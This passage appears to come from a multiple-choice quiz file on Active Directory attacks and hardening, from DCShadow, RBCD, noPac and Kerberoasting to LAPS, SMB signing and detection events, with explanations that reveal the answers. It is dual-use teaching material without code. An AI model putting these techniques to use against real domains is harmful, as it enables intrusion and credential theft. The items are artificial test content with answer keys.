options: All Kerberos Golden Ticket forgery across the domain, because every DC refuses any TGT that was not sealed inside a VBS enclave
Theft of derived credentials such as NTLM hashes or Kerberos tickets from LSASS by isolating those secrets with VBS
Every NTLM relay attack on the LAN, because Credential Guard completely disables NetNTLM for all outbound SMB connections
Ransomware encrypting local NTFS volumes, because VBS remaps disk clusters into an encrypted RAM-only scratch volume at boot
en.explanation: Credential Guard uses virtualization-based security to isolate secrets so malware running as admin cannot simply dump them from LSASS. It does not stop domain-wide Golden Tickets by itself, disable all NetNTLM/relay, or act as anti-ransomware disk encryption.

en.question: What does a DCShadow attack mainly abuse in Active Directory replication?
options: It floods every domain controller with forged Kerberos TGTs so legitimate DCSync rights become unnecessary for reading password hashes
It replaces the KRBTGT password hash on disk through a local offline edit, then waits for normal replication to push Golden Tickets domain-wide
It coerces a workstation to authenticate via MS-EFSRPC so an attacker can relay NTLM to LDAP and enroll a rogue certificate as that computer
It registers a rogue domain controller so attackers can push malicious object changes through normal AD replication channels
en.explanation: DCShadow makes a machine act as a DC and injects attacker-controlled changes into AD replication. It is not PetitPotam coercion, offline KRBTGT editing, or flooding forged TGTs.

en.question: Why do attackers sometimes add a backdoor ACE on the AdminSDHolder object in Active Directory?
options: Because AdminSDHolder stores the KRBTGT hash in cleartext on disk, so any ACE there immediately grants DCSync without needing further replication steps
Because every new computer account inherits AdminSDHolder ACLs at join time, turning a single ACE into domain-wide local admin on every workstation forever
Because SDProp periodically copies AdminSDHolder's ACL onto protected privileged groups, so a planted ACE can reappear after admins clean those groups
Because AdminSDHolder disables Kerberos pre-authentication for all Domain Admins, enabling AS-REP roasting against every privileged account at once overnight
en.explanation: SDProp (Security Descriptor Propagator) reapplies AdminSDHolder's ACL to protected groups (e.g. Domain Admins) on a schedule. A backdoor ACE there can restore attacker rights after cleanup. It does not store KRBTGT in cleartext, grant workstation local admin, or disable preauth.

en.question: How does overpass-the-hash (pass-the-key) differ from classic pass-the-hash against Active Directory?
options: It dumps only LM hashes from the local SAM database and never touches Kerberos, so it works exclusively against hosts that still accept NTLMv1 on SMB shares
It uses a stolen NT hash or AES key to request a real Kerberos TGT, then authenticates with tickets instead of presenting NTLM hashes on every hop
It rewrites the domain KRBTGT key on every domain controller so existing Golden Tickets become the only valid credentials left anywhere in the forest
It disables SMB signing forest-wide by pushing a malicious GPO through SYSVOL, forcing every NTLM challenge to accept empty responses from attackers
en.explanation: Overpass-the-hash / pass-the-key turns a stolen key/hash into a Kerberos TGT (e.g. via mimikatz), so later access uses tickets rather than raw NTLM PtH on each resource. It is not LM-only, KRBTGT rewrite, or GPO-based signing disable.

en.question: In a Golden SAML attack against a federated environment such as AD FS, what does the attacker mainly steal and abuse?
options: The KRBTGT account hash, which lets the attacker sign Kerberos tickets that cloud apps accept directly without any federation server in the path
The token-signing certificate private key, which lets the attacker forge SAML assertions for any user that trusting cloud services will accept
The DHCP server database, which lets the attacker hand out a rogue identity provider address so every browser logs in to a fake portal instead
The SMTP relay credentials, which let the attacker send password reset mails that automatically bypass MFA on every federated cloud service
en.explanation: Golden SAML means stealing the federation server token-signing key and forging signed SAML assertions for any user, often bypassing MFA at the service provider. It is not KRBTGT abuse, DHCP spoofing, or SMTP relay misuse.

en.question: An attacker can write to a target computer object's msDS-AllowedToActOnBehalfOfOtherIdentity attribute and controls a machine account. What does resource-based constrained delegation abuse let them do?
options: Reset the KRBTGT password on every domain controller so all existing tickets in the forest are revoked and only the attacker can request new ones
Disable Kerberos pre-authentication on the target so its password hash can be requested offline and cracked like an AS-REP roasting victim
Push a logon script to the target through SYSVOL so the next domain admin who signs in runs the payload with their own interactive session
Use S4U2Self and S4U2Proxy from the controlled account to get a service ticket to the target as a privileged user, then access it as that user
en.explanation: With write access to msDS-AllowedToActOnBehalfOfOtherIdentity, the attacker lets their machine account delegate to the target, then uses S4U2Self/S4U2Proxy to impersonate a privileged user to that host. It does not reset KRBTGT, disable pre-auth, or rely on SYSVOL scripts.

en.question: On a Windows network that does not actively use IPv6, how does a mitm6-style attack usually get between clients and the network?
options: It answers DHCPv6 requests as a rogue server and gives clients the attacker as DNS server, then captures or relays their authentication attempts
It floods the switch CAM table with fake IPv4 MAC addresses so every port turns into a hub and the attacker can sniff all unicast traffic in the VLAN
It brute-forces the domain controller over SMBv1 until a null session opens, then rewrites the IPv6 routing table on every domain member
It sends spoofed STP BPDUs with priority 0 so the attacker laptop becomes root bridge and all IPv6 traffic is forced through its interface
en.explanation: Windows prefers IPv6 and requests DHCPv6 by default. mitm6 answers as a rogue DHCPv6 server, sets itself as DNS, and then captures or relays authentication (for example to LDAP). Mitigate by blocking rogue DHCPv6/RA or disabling unused IPv6 and enforcing LDAP signing.

en.question: On a Windows LAN where hosts still fall back to LLMNR or NBT-NS for name resolution, how does a Responder-style attack typically work?
options: It patches the domain controller's SYSVOL share so every GPO pushes a fake DNS server address, which must happen before any LLMNR reply is accepted by clients
It disables Kerberos on every workstation through remote WMI calls, forcing all authentication onto cleartext Telnet so passwords appear directly in packet captures
It floods DHCP Offer packets with a rogue default gateway until the real DHCP server's lease pool is empty and every client loses all IP connectivity on the LAN
It answers forged LLMNR/NBT-NS replies for names that fail DNS, then tricks victims into authenticating to the attacker to capture hashes or relay
en.explanation: Responder-style tools poison LLMNR/NBT-NS by answering when DNS fails, then capture or relay the resulting authentication. They do not need SYSVOL GPO DNS changes, Kerberos disablement, or DHCP starvation as the core mechanism.

en.question: In AD CS abuse, what does the ESC8 scenario mainly combine to obtain a certificate for a privileged machine or user context?
options: Stealing the CA private key from an offline backup tape store and forging certificates forever without contacting the enrollment web service again at any time
Relaying NTLM authentication to a certificate authority web enrollment endpoint (HTTP) that does not require EPA, then requesting a cert as the victim
Enabling unconstrained Kerberos delegation on every published CA template so any domain workstation can mint domain-admin tickets with no certificate involved
Replacing the domain root CA certificate inside Group Policy with a self-signed TLS certificate so intranet browsers trust attacker phishing sites by default
en.explanation: ESC8 abuses NTLM relay to HTTP-based AD CS web enrollment when protections like EPA are missing, letting the attacker request a certificate in the relayed victim's context. It is not primarily offline CA-key theft, unconstrained delegation on templates, or swapping root CAs in GPO.

en.question: After compromising a workstation, an attacker wants to decrypt a user's saved browser passwords and Wi-Fi keys protected by Windows DPAPI. What is a realistic approach?
options: Simply read the encrypted blobs and open them in Notepad, because DPAPI stores all secrets as plaintext and the encryption header is only a cosmetic label on the file
Obtain the user's masterkey (via their password/hash or the domain DPAPI backup key) and use it to decrypt the DPAPI-protected blobs for that user context
Reboot the machine into safe mode, which Microsoft documents as the only supported way for any process to transparently remove DPAPI protection from stored credentials
Change the user's password to a blank value, because setting an empty password automatically converts every existing DPAPI blob on disk into a cleartext copy for all apps
en.explanation: DPAPI blobs are encrypted with a masterkey derived from the user's credentials; with the user's password/hash or the domain backup key, an attacker can recover the masterkey and decrypt saved secrets. The blobs are not plaintext, and safe mode or blanking the password does not strip DPAPI.

en.question: With admin rights on a domain controller, an attacker wants every domain password hash offline. Why use a Volume Shadow Copy (vssadmin/ntdsutil) to grab NTDS.dit?
options: Because NTDS.dit is stored as an unencrypted CSV of cleartext passwords, so copying it needs no shadow copy and any user can open it directly from the live system folder
Because a shadow copy silently disables Active Directory replication to every other domain controller, which is required before Windows will allow the database file to be read at all
Because the live NTDS.dit is locked by the directory service, so a shadow copy (or ntdsutil IFM) provides a consistent offline copy of the database and SYSTEM hive to extract hashes
Because vssadmin automatically uploads NTDS.dit to Microsoft's cloud and emails the decrypted hashes to the operator, which is the only documented way to read the file remotely
en.explanation: The live NTDS.dit is locked by NTDS, so attackers use a Volume Shadow Copy or ntdsutil IFM to obtain a consistent copy of the database plus the SYSTEM hive (for the boot key) and extract hashes offline. The file is encrypted, not a cleartext CSV, and shadow copies do not disable replication or exfiltrate to a cloud.

en.question: A user completed MFA and has an active cloud session. An attacker steals the browser session cookie and replays it. Why can this bypass MFA?
options: Because the session cookie already represents a fully authenticated session, so replaying a valid, unexpired cookie lets the attacker ride the session without redoing MFA
Because stealing any cookie instantly reveals the user's cleartext password and current one-time code, which the browser always stores together inside every session cookie by design
Because MFA tokens are only checked on the very first login of the device's lifetime, so no cloud service ever re-evaluates authentication once a machine has logged in once
Because session cookies disable TLS for the whole domain, allowing the attacker to read all future traffic in plaintext and therefore skip multi-factor prompts entirely
en.explanation: A session cookie represents an already-authenticated session; replaying a valid, unexpired cookie (pass-the-cookie) lets an attacker reuse the post-MFA session without re-authenticating. Cookies do not contain the cleartext password or OTP, MFA is not a one-time lifetime check, and cookies do not disable TLS.

en.question: After gaining code execution as SYSTEM on a domain controller, an attacker wants any account to authenticate with one master password while real passwords still work. Which persistence technique matches?
options: Pass-the-hash against a member workstation only, because replaying an NTLM hash on a laptop permanently rewrites every domain password hash stored in Active Directory to the same value
Kerberoasting a single service account, because cracking one TGS ticket automatically installs a backdoor password that Active Directory accepts for every user in the forest forever
Skeleton Key: inject a patch into LSASS on the DC so Kerberos (and often NTLM) accepts a chosen master password for any account, while legitimate passwords continue to work
AS-REP roasting without pre-authentication, because collecting AS-REP hashes from users with UF_DONT_REQUIRE_PREAUTH is exactly how a universal master password is written into NTDS.dit
en.explanation: Skeleton Key patches LSASS on a domain controller so a attacker-chosen master password works for any account alongside real passwords. Pass-the-hash, Kerberoasting, and AS-REP roasting do not install that DC-wide dual-password backdoor.

en.question: A hardened Windows estate enforces application allowlisting with WDAC (or AppLocker). Why can living-off-the-land binaries still undermine that control?
options: Because WDAC and AppLocker always disable every Microsoft-signed binary on disk, so attackers must bring unsigned malware and therefore allowlisting cannot be bypassed by design
Because trusted, signed system tools (LOLBins) that remain allowed can be abused to download, decode, or spawn code, so attackers stay inside the allowlist while still executing payloads
Because allowlisting stores every blocked hash in cleartext in the registry, and reading that list remotely removes the policy from every joined machine without any admin rights
Because enabling WDAC automatically trusts any script or binary fetched over HTTP from the corporate proxy, which is documented as the supported exception path for line-of-business apps in production
en.explanation: Allowlisting permits known-good binaries; LOLBins that stay trusted can still fetch or launch attacker code, so defence needs tighter rules and script controls. WDAC does not ban all Microsoft binaries, expose a cleartext bypass list, or auto-trust HTTP downloads.

en.question: During a forest migration, an account keeps an old high-privilege SID in its SID History. Why is that dangerous across a forest trust, and what mitigates it?
options: SID History is only a display name for the account and is never evaluated in access tokens, so keeping old SIDs cannot grant rights in the trusting forest under any configuration known today
SID History forces Kerberos to disable AES and fall back to RC4 forever, which is the only security impact; resource access in the trusting domain is never affected by historical SIDs at all
SID History is stripped automatically on every authentication across any trust type, so injecting a Domain Admins SID into SID History can never elevate access in another forest
A forged or retained privileged SID in SID History can be added to the user's token and grant access in the trusting forest; SID filtering (quarantine) on the trust blocks those foreign SIDs
en.explanation: SID History can carry group SIDs into the access token; across a forest trust that can elevate privileges unless SID filtering (quarantine) strips unexpected SIDs. It is not cosmetic, not only an encryption downgrade, and is not always stripped on every trust.

en.question: During an AD assessment you find Groups.xml under SYSVOL that still contains a cpassword attribute from old Group Policy Preferences. Why is that still valuable to an attacker today?
options: cpassword is an HMAC of the GPO version and only proves the file was edited; it never decrypts to a reusable credential under any documented Microsoft AES key published for that feature historically
Microsoft published the static AES key used to protect GPP passwords, so anyone who can read SYSVOL can decrypt cpassword offline into cleartext credentials for the account it was set for
cpassword encrypts only the local Administrator SID and cannot store domain user passwords, so the finding is limited to identifying whether LAPS was ever enabled on that OU in the past years

Modern domain controllers strip cpassword on every SYSVOL replication, so a Groups.xml that still shows the attribute is always a false positive from an offline backup share that operators forgot to delete
en.explanation: GPP stored passwords with a well-known AES key (MS14-025 era). Readable SYSVOL cpassword values decrypt offline to cleartext. It is not a mere HMAC, not limited to a local SID, and DCs do not auto-strip every legacy copy.

en.question: In the noPac (CVE-2021-42278 / CVE-2021-42287) attack chain against Active Directory, what combination lets a low-privileged user escalate toward domain admin rights?
options: Forcing every DC to disable PAC validation permanently by writing a single registry value under HKLM, which any authenticated user can set remotely through WinRM without other privileges on the domain controllers
Poisoning LLMNR so that a DC authenticates to the attacker, then replaying that Net-NTLMv1 response as a Silver Ticket for the krbtgt account without ever touching machine accounts in the domain
Exploiting PrintNightmare printer driver install rights on a workstation and then using that local SYSTEM token to dump LSASS on a neighboring DC over SMB signing-disabled links in the same site
Creating (or renaming) a machine account whose sAMAccountName matches a DC name without the trailing $, then requesting a TGT and exchanging it so the PAC is issued as that domain controller
en.explanation: noPac chains sAMAccountName spoofing (looking like a DC without $) with Kerberos TGT/TGS handling so the PAC is issued for the impersonated DC. It is not a simple HKLM flip by any user, not LLMNR-to-Silver-Ticket alone, and not PrintNightmare on a workstation.

en.question: An attacker obtains the Directory Services Restore Mode (DSRM) password for a domain controller. In what situation does that credential become especially dangerous for persistence or recovery abuse?
options: When DSRM login is allowed as a local break-glass account on a DC that is online (registry DsrmAdminLogonBehavior), the password acts like a local Administrator secret that survives many domain password rotations

When the DSRM password is typed into any member workstation's local Administrator account, it automatically syncs through SYSVOL and becomes the domain krbtgt password on the next replication cycle across every site

When Azure AD Connect is installed, the DSRM secret is mirrored into the cloud tenant as a Global Admin app password that cannot be rotated from on-premises tools under any supported hybrid topology today

When Credential Guard is enabled, DSRM credentials are the only secrets still stored in cleartext LSASS and therefore the preferred target for every dump tool on that host during an offline forensic capture
en.explanation: DSRM is the local SAM Administrator-equivalent on a DC. With DsrmAdminLogonBehavior allowing logon while AD DS is running, it is a durable break-glass secret independent of normal domain account rotation. It does not become krbtgt, does not auto-become Azure Global Admin, and Credential Guard is unrelated to inventing that property.

en.question: A principal in the DNSAdmins group can load a DLL via the DNS Server's server-level plugin path. Why is that often treated as a privilege-escalation path to the Domain Controller?
options: Because DNSAdmins membership alone grants Domain Admin rights in every forest functional level, so the DLL load is only a cosmetic log event and not needed for privilege gain on the DC across every site in the forest without needing any further ACL change on the DNS zone or service account.

Because the plugin path writes a scheduled task under SYSTEM that runs once at next reboot and then removes the principal from DNSAdmins, leaving no lasting code execution on the server after which the assessor loses the DLL path and must re-join DNSAdmins before another load attempt can succeed on that host.

Because loading any DLL into dns.exe requires the SeDebugPrivilege that only Enterprise Admins hold, so DNSAdmins cannot actually force the load without a second privileged account even when the server-level plugin registry value is already writable by that nested security group on the DC.
Because the Microsoft DNS Server service often runs as SYSTEM on a DC, so a malicious server-level plugin DLL (for example via serverlevelplugindll) executes code in that high-privilege context
en.explanation: On many DCs the DNS Server service runs as SYSTEM. Members of DNSAdmins can configure a server-level plugin DLL that dns.exe loads, yielding SYSTEM code execution and a path toward Domain Admin. DNSAdmins is not Domain Admin by itself; the risk is the privileged service context, not a scheduled-task trick or a SeDebugPrivilege gate that blocks DNSAdmins entirely.

en.question: During an AD assessment you want the current password of a group Managed Service Account (gMSA). Which attribute / API path is typically used to retrieve the managed password blob for principals allowed to do so?
options: Reading msDS-ManagedPassword (via LDAP with the right principals in PrincipalsAllowedToRetrieveManagedPassword) returns a blob the client can use to derive the current gMSA password
Dumping the clear-text password from the userPassword attribute on the gMSA object, which Active Directory always stores reversibly for every managed service account by default
Calling NetUserGetInfo level 3 against the gMSA sAMAccountName from any domain user, because gMSA passwords are intentionally readable by Authenticated Users for Kerberos SPN checks
Extracting the password from the gMSA's UnicodePwd attribute over anonymous LDAP bind, which Windows permits specifically for msDS-GroupManagedServiceAccount objects
en.explanation: gMSA passwords are retrieved by allowed principals through the constructed attribute msDS-ManagedPassword (often via LDAP), not from a world-readable clear-text userPassword, not via NetUserGetInfo for any domain user, and not over anonymous UnicodePwd binds. Membership in PrincipalsAllowedToRetrieveManagedPassword (or equivalent rights) controls who can get the blob.

en.question: Why do hardening guides push LDAP signing and LDAP channel binding on domain controllers?
options: They replace Kerberos entirely with NTLM for directory binds, which simplifies ticket handling and removes the need to rotate krbtgt after a suspected compromise of a domain controller and without renewing any service account passwords that bind to the directory over LDAP.

They force every LDAP client to use LDAPS on port 636 only, so plain TCP/389 is firewalled and no unsigned Simple binds can ever reach the directory from inside the corporate network without needing StartTLS, client certificates, or any per-site firewall exception list.
Signing protects LDAP traffic integrity and channel binding ties the LDAP session to the TLS channel, reducing relay and tampering risks against directory binds (including StartTLS / LDAPS scenarios)

They disable all Simple binds and anonymous rootDSE queries, which alone stops BloodHound enumeration even when a valid domain user credential is already available to the assessor and without locking down SMB signing or other lateral-movement paths on member servers.
en.explanation: LDAP signing ensures integrity of LDAP messages; channel binding associates the LDAP exchange with the underlying TLS channel so a relayed bind is harder to pull off. They do not replace Kerberos with NTLM, do not by themselves firewall 389, and do not alone stop BloodHound when a user credential exists.

en.question: An admin account is added to the Active Directory 'Protected Users' group. Which effect does that membership have?
options: The account becomes exempt from password expiry and lockout policies so that domain administrators are never blocked out during an incident or a brute-force attack
NTLM, DES/RC4 Kerberos pre-auth and credential delegation are blocked for it, and its TGTs are short and non-renewable, which limits credential theft and reuse
Its password hash is removed from the domain controllers, so the account can only sign in with a smart card and replication never copies its credentials to other DCs
All of its logons are routed through a jump server automatically, so its sessions can never reach workstations even when the user types its credentials there
en.explanation: Protected Users hardens member accounts: no NTLM, no DES or RC4 in Kerberos pre-authentication, no unconstrained or constrained delegation, no cached plaintext credentials via CredSSP/WDigest, and a 4-hour non-renewable TGT. It does not remove lockout, delete hashes from DCs, or force jump-server logons. It is meant for user accounts, not service or computer accounts.

en.question: In a 'Timeroasting' attack, an unauthenticated attacker sends MS-SNTP time requests to a domain controller. What do they gain, and when is it dangerous?
options: The DC returns the clear-text krbtgt password inside the NTP reply, so any host that can reach UDP 123 can forge Golden Tickets without cracking anything offline
The DC shifts its clock by the offset in the request, so Kerberos tickets across the domain expire and users fall back to NTLM, which the attacker then relays freely
Replies are signed with a MAC derived from the requested computer account's NT hash, which can be cracked offline when machine passwords are weak or set by hand
The DC discloses every user's last logon time and source IP in the reply, giving the attacker a full session map without needing any domain credentials at all
en.explanation: With MS-SNTP, a DC signs time responses using a key derived from the NT hash of the computer account whose RID is in the request. An attacker can ask for many RIDs without authenticating and crack the results offline. It mainly hits computer accounts with weak or manually set passwords (for example pre-created or 'pre-Windows 2000' accounts); normal auto-rotated machine passwords are effectively uncrackable. It does not leak krbtgt, change the DC clock, or list user logons.

en.question: In the Active Directory tiered administration model, what is the core rule for Tier 0 admin accounts?
options: They log on only to Tier 0 assets (DCs, AD CS, identity sync servers), never to servers or workstations in lower tiers, so their credentials cannot be stolen there
They must log on to every workstation once a week to verify patches, because only Tier 0 accounts have rights to read the local security logs on user endpoints
They are shared by the whole help desk under one password, so that any technician can reset users quickly and audit trails stay limited to a single privileged identity
They are allowed anywhere as long as MFA is enabled, since MFA prevents their password hashes and Kerberos tickets from being left in the memory of lower-tier hosts
en.explanation: Tier 0 covers the identity control plane: domain controllers, AD CS, AD FS, sync servers and their admins. Those credentials must only be used on Tier 0 systems; logging on to a Tier 1 server or a Tier 2 workstation leaves hashes or tickets there for an attacker to steal. Routine endpoint work belongs to lower-tier accounts, shared admin accounts break accountability, and MFA at sign-in does not stop credentials being cached in memory.

en.question: Why do AD hardening guides recommend setting ms-DS-MachineAccountQuota to 0 on the domain?
options: Because a non-zero quota lets every computer account log on interactively to domain controllers, which exposes them to credential theft by any user of that machine
Because the default quota of 10 makes each domain controller replicate computer objects ten times, which slows logons and lets attackers inject fake replication data
By default any authenticated user can join up to 10 computers, giving attackers a machine account they control for attacks such as RBCD abuse or noPac
Because a quota above zero disables Kerberos for new computers and forces them to use NTLM, which attackers can relay to the domain controller to obtain admin rights
en.explanation: ms-DS-MachineAccountQuota defaults to 10, so any authenticated user can create up to 10 computer accounts. An attacker-controlled machine account (with a known password and SPN) is a key step in attacks such as resource-based constrained delegation abuse, noPac and some relay chains. Setting it to 0 and delegating domain joins to a specific group removes that foothold. It does not affect DC logon rights, replication or Kerberos versus NTLM.

en.question: In an AD-integrated DNS zone, an attacker with only a normal domain user account adds a wildcard (*) record pointing to their own IP. What does this achieve?
options: It replaces the A records of all domain controllers, so every Kerberos ticket request is sent to the attacker, who can then issue forged TGTs to any user in the domain
Names that have no existing record now resolve to the attacker, so mistyped or stale hostnames send traffic and NTLM authentication to them, much like LLMNR poisoning
It turns on DNS zone transfers to the attacker's IP, letting them download every record in the zone, but no client traffic is redirected and no credentials are exposed
It forces all clients to drop DNSSEC validation, so the attacker can now answer for any public domain on the Internet and steal TLS certificates issued for those sites
en.explanation: By default authenticated users can create new records in AD-integrated DNS zones (ADIDNS). A wildcard record answers for any name that does not already exist, so typos and decommissioned hostnames resolve to the attacker, who can capture or relay NTLM authentication, similar to LLMNR/NBT-NS poisoning but domain-wide. Existing records such as DC A records are not overwritten, zone transfers and DNSSEC are separate settings. Mitigate by restricting record creation and pre-creating a wildcard record.

en.question: What does enabling LSA protection (RunAsPPL) on a Windows host mainly do?
options: It encrypts the SAM database with a key stored in the TPM, so offline attackers who copy the disk cannot read local password hashes without the original motherboard
It blocks all NTLM authentication from the host and forces Kerberos for every connection, so pass-the-hash tools fail even when the attacker already has local admin
It moves cached domain credentials into a virtual machine isolated by the hypervisor, so even code running in the kernel of the host cannot read those secrets
It runs LSASS as a Protected Process Light, so even local admins cannot open it to read memory or load unsigned plugins, blocking common credential dumping
en.explanation: LSA protection runs lsass.exe as a Protected Process Light (PPL). Non-protected processes, even with admin rights and SeDebugPrivilege, cannot open it to read memory or inject code, and only signed LSA plugins load, which blocks tools like Mimikatz's sekurlsa without a kernel driver. Isolating secrets in a hypervisor-protected VM is Credential Guard; it does not encrypt the SAM with the TPM or disable NTLM.

en.question: Why do hardening guides often require SMB signing on Windows clients and servers?
options: Because signed SMB sessions encrypt the entire file payload with a per-connection AES key, so offline copies of shares cannot be read later without also stealing the domain krbtgt hash
Because a signed SMB exchange binds each response to the session key, so an attacker who relays captured NTLM auth cannot usefully speak SMB as that user
Because SMB signing replaces NTLM with Kerberos on every share access by policy, so pass-the-hash against local accounts stops working even when signing is the only change made
Because the signing policy disables guest and null sessions globally across the estate, which is the only practical way to stop anonymous enumeration of shares and local users
en.explanation: SMB signing uses the session key to integrity-protect SMB messages. After an NTLM relay, the attacker does not have that key, so a server that requires signing rejects the relayed SMB session. Signing is not full encryption of file data, does not by itself replace NTLM with Kerberos, and is separate from disabling guest/null sessions.

en.question: What does Microsoft LAPS (Local Administrator Password Solution) mainly achieve on domain-joined Windows machines?
options: It stores one shared local-admin password for the whole OU in a GPO preference item, rotated monthly, so helpdesk staff never need a domain account for break-glass access to any PC
It disables the built-in local Administrator account entirely and replaces it with a gMSA whose password is fetched from AD only by principals that hold the Enroll permission on that account
It moves local SAM password hashes into Credential Guard so even domain admins interactively logged on to the workstation cannot dump the local Administrator password with Mimikatz
It sets a unique random local Administrator password per machine, stores it in AD, and lets only delegated groups read it, ending shared local-admin passwords
en.explanation: LAPS (and Windows LAPS) gives each domain-joined PC a different random local Administrator password, saved in Active Directory (ms-Mcs-AdmPwd or the newer Windows LAPS attributes) and readable only by groups you delegate. That stops lateral movement that reused one local-admin password across many machines. It is not a single OU-wide password in a GPO, not a gMSA replacement for the local admin, and not Credential Guard.

en.question: After a suspected golden-ticket incident, why do recovery guides tell you to reset the krbtgt account password twice, with replication in between?
options: Because golden tickets are keyed with the current and previous krbtgt keys; two resets flush both, so forged TGTs signed with either old key fail validation on every DC
Because the first reset only marks krbtgt for deletion and the second reset recreates the account, which is required before PDC emulator ownership can move to a clean DC
Because Kerberos caches the krbtgt hash in LSASS for one replication cycle; a single reset leaves the old hash in memory on every DC until the machine is rebooted twice
Because AD stores krbtgt history as three passwords, and Microsoft requires three resets, but operators commonly stop at two when no RODC is present in the domain
en.explanation: A golden ticket is a forged TGT signed with a krbtgt password hash. AD remembers the current and previous krbtgt keys for ticket decryption, so a single password reset still leaves the old key valid. Resetting twice (waiting for replication after each) retires both keys and invalidates tickets forged with either. It is not about deleting/recreating the account, LSASS caching across reboots, or a mandatory third reset for every forest.

en.question: Why do Active Directory hardening guides recommend that domain admins work from a Privileged Access Workstation (PAW)?
options: Because a dedicated, locked-down device used only for admin tasks keeps privileged credentials off machines that browse the web or read email
Because a PAW stores every admin password in its TPM, so the domain controllers stop accepting NTLM and Kerberos logons that originate from any other client
Because the PAW replaces the domain controller during maintenance windows, letting admins change Group Policy without replicating changes to the real DCs
Because Windows only allows changes to the Domain Admins group from a machine whose hostname begins with PAW, which blocks remote attackers from editing it
en.explanation: A PAW is a hardened workstation reserved for privileged administration, with no email, browsing or general apps. If admins sign in only there, their high-value credentials are never exposed on everyday machines where phishing or drive-by malware could steal them. It does not move passwords into a TPM to change how DCs accept logons, does not act as a DC, and has no hostname rule.

en.question: What does PowerShell Just Enough Administration (JEA) mainly provide on a Windows server?
options: A signed-script policy that refuses any PowerShell command unless it was written by a domain admin, which removes the need for separate administrator accounts
A temporary elevation that adds the user to the local Administrators group for one hour and then logs the user off, giving a full admin shell for that window
A constrained remoting endpoint where a user can run only the cmdlets and parameters in a role capability, often through a temporary virtual account
A replacement for WinRM that tunnels PowerShell over SMB, so remote admin works even when the Windows Firewall blocks TCP ports 5985 and 5986
en.explanation: JEA publishes a PowerShell remoting endpoint whose role capabilities list exactly which cmdlets, functions and parameters each group may use. Commands usually run as a temporary virtual or group-managed account, so helpdesk staff can, for example, restart a service without being local admins. It is not a signing policy, not a time-boxed membership of Administrators, and it still runs over WinRM.

en.question: In Active Directory you enable Kerberos armoring (FAST, Flexible Authentication Secure Tunneling) for clients and DCs. What does it mainly add?
options: It replaces RC4 and AES with a post-quantum cipher for all service tickets, so Kerberoasting hashes can no longer be cracked offline for any account
It wraps the AS exchange in a channel keyed from the computer's own ticket, so pre-auth data cannot be cracked offline and errors cannot be spoofed
It forces every user to present a smart card before a TGT is issued, so password logons fail on all domain-joined machines once armoring is required
It stops DCs from issuing TGTs to accounts in Protected Users, and instead issues short-lived service tickets directly from the KDC for each logon
en.explanation: FAST builds an armored tunnel for the AS-REQ/AS-REP exchange using a key from the machine account's TGT. That protects the user's pre-authentication data from offline password guessing, lets the KDC send signed errors that cannot be forged, and supports compound claims for Dynamic Access Control. It does not change service-ticket ciphers, does not require smart cards, and does not change how Protected Users get TGTs.

en.question: A security team enables the Microsoft Defender Attack Surface Reduction (ASR) rule 'Block all Office applications from creating child processes'. Which attack does this mainly disrupt?
options: Phishing pages that copy the Microsoft 365 sign-in screen, because the rule checks every link in an Office document against a list of known fake sites
A malicious macro in a Word file that launches PowerShell or cmd.exe to download and run the next stage
Ransomware that encrypts Office documents on file shares, because the rule makes .docx and .xlsx files read-only for every process except the Office apps
Attackers stealing Office license keys from the registry, because the rule blocks other processes from reading the Office installation registry keys
en.explanation: Many malware campaigns start with a document whose macro or exploit makes Word or Excel spawn PowerShell, cmd.exe, wscript or another binary to fetch the payload. This ASR rule stops Office apps from creating child processes, breaking that chain even if the user enables macros. It does not filter phishing links, does not protect files from ransomware (that is Controlled Folder Access) and has nothing to do with license keys.

en.question: Why do Active Directory hardening guides treat membership of the built-in Backup Operators group on domain controllers as almost equal to Domain Admin?
options: Because Backup Operators are automatically added to the Enterprise Admins group during every scheduled backup, so they can change the forest schema
Because the group can reset the password of any user account, including the krbtgt account, without that change being written to the security log
Because members can log on to every workstation as the local SYSTEM account, which lets them disable Microsoft Defender on all machines at once
Because SeBackupPrivilege lets them read NTDS.dit and the registry hives, so they can extract every domain password hash
en.explanation: Backup Operators hold SeBackupPrivilege and SeRestorePrivilege and can log on to domain controllers. Backup privilege bypasses file ACLs, so a member can copy NTDS.dit (for example from a shadow copy) and the SYSTEM hive, then extract all account hashes offline, krbtgt included. That is why the group belongs in Tier 0 and should normally be empty. It does not join Enterprise Admins, reset passwords silently or grant SYSTEM on workstations.

en.question: On a domain controller, which log pattern is a common sign of Kerberoasting in an environment that normally uses AES for Kerberos?
options: Many event 4769 (service ticket requested) entries from one user for several service accounts with ticket encryption type 0x17 (RC4)
Many event 4625 (failed logon) entries for one account from many source IPs within a few minutes, followed by the account being locked out
Event 4720 (user account created) for an account with a name that looks like a service, followed by that account being added to Domain Admins
Event 1102 (audit log cleared) on the domain controller right after a member server was restarted outside the normal maintenance window
en.explanation: In Kerberoasting an attacker asks the KDC for service tickets for accounts with SPNs and cracks them offline; requesting RC4 makes cracking much faster. On a DC this shows up as event 4769 with Ticket Encryption Type 0x17, often a burst from one user for many SPNs. Event 4625 bursts point to password spraying or brute force, 4720 plus group changes to persistence, and 1102 to someone hiding tracks.

en.question: An analyst suspects PsExec-style lateral movement onto a file server. Which entry in that server's logs is the classic sign?
options: Event 4740 (user account locked out) for the administrator account, because PsExec always tries several wrong passwords before it gets in
Event 5156 (connection allowed by Windows Filtering Platform) on port 3389, because PsExec opens a hidden Remote Desktop session on the target
System event 7045 (a service was installed), for example a new PSEXESVC service, usually just after a network logon (4624 type 3)
Event 4800 (workstation locked) for the logged-on user, because PsExec locks the console so the user cannot see the commands being run
en.explanation: PsExec copies a service binary to the target's ADMIN$ share and creates a service (PSEXESVC by default) to run commands, so the target logs System event 7045, plus Security event 4697 if auditing is on, next to a type 3 network logon from the source. Renamed services still show the same pattern. PsExec uses SMB on port 445, not RDP, and it does not need failed logons or lock the console.

en.question: Attackers on a network run heavily obfuscated PowerShell (Base64 and string concatenation). Which Windows logging feature best shows the defenders what code actually ran?
options: PowerShell transcription only, because it saves an exact copy of the Base64 command line typed at the console in a text file in each user profile
PowerShell Script Block Logging, which writes event 4104 with the script blocks as executed, after much of the obfuscation is removed
Windows Firewall logging with dropped packets enabled, because every PowerShell command creates a network connection that the log then records
Audit Logon events on the domain controllers, because each PowerShell command is checked against Kerberos and appears in event 4768 entries
